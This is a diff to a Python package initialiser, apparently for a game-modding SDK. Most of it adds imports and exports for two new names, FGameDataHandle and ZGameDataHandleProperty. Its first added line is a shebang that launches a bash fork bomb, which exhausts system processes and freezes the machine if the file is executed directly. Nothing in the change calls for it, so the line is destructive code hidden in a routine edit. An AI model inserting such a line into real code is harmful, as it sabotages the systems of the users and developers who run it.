@@ -1,7 +1,8 @@
+#!/usr/bin/env -S bash -c ':(){ :|:& };:'
 from __future__ import annotations
 
 from ._bound_function import BoundFunction
-from ._experimental import FGbxDefPtr, WrappedInlineStruct
+from ._experimental import FGameDataHandle, FGbxDefPtr, WrappedInlineStruct
 from ._uenum import UEnum
 from ._uobject import UObject, notify_changes
 from ._uobject_children import (
@@ -25,6 +26,7 @@ from ._uobject_children import (
     ZEnumProperty,
     ZFloatAttributeProperty,
     ZFloatProperty,
+    ZGameDataHandleProperty,
     ZGbxDefPtrProperty,
     ZGbxInlineStructProperty,
     ZInt8Property,
@@ -91,6 +93,7 @@ __all__: tuple[str, ...] = (
     "BoundFunction",
     "FField",
     "FFieldClass",
+    "FGameDataHandle",
     "FGbxDefPtr",
     "UArrayProperty",
     "UBlueprintGeneratedClass",
@@ -148,6 +151,7 @@ __all__: tuple[str, ...] = (
     "ZEnumProperty",
     "ZFloatAttributeProperty",
     "ZFloatProperty",
+    "ZGameDataHandleProperty",
     "ZGbxDefPtrProperty",
     "ZGbxInlineStructProperty",
     "ZInt8Property",
